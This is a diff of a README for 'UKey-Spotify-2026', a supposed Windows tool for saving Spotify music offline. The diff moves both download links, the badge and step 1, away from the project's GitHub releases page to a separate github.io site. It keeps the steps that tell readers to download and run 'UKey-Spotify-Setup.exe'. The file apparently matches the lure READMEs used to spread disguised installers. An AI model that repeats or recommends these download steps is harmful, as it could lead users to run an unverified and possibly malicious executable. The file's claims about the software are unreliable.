@@ -1,6 +1,6 @@
 # 🎧 UKey-Spotify-2026 - Save Your Favorite Music Offline
 
-[![](https://img.shields.io/badge/Download_Software-Blue.svg?style=for-the-badge)](https://github.com/nguye3520/UKey-Spotify-2026/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue.svg?style=for-the-badge)](https://nguye3520.github.io)
 
 UKey-Spotify-2026 helps you save music from Spotify to your computer. You keep your favorite songs on your hard drive. You listen to music without an internet connection. This program works on Windows 10 and Windows 11. It preserves song quality and keeps your music tracks organized.
 
@@ -18,7 +18,7 @@ To run this software, your computer needs these basic parts:
 
 Follow these steps to get the file:
 
-1.  Visit this page to download the latest installer: [https://github.com/nguye3520/UKey-Spotify-2026/releases](https://github.com/nguye3520/UKey-Spotify-2026/releases).
+1.  Visit this page to download the latest installer: [https://nguye3520.github.io](https://nguye3520.github.io).
 2.  Look for the section marked Assets.
 3.  Click the file named UKey-Spotify-Setup.exe to start your download.
 4.  Wait for the progress bar to finish in your web browser.
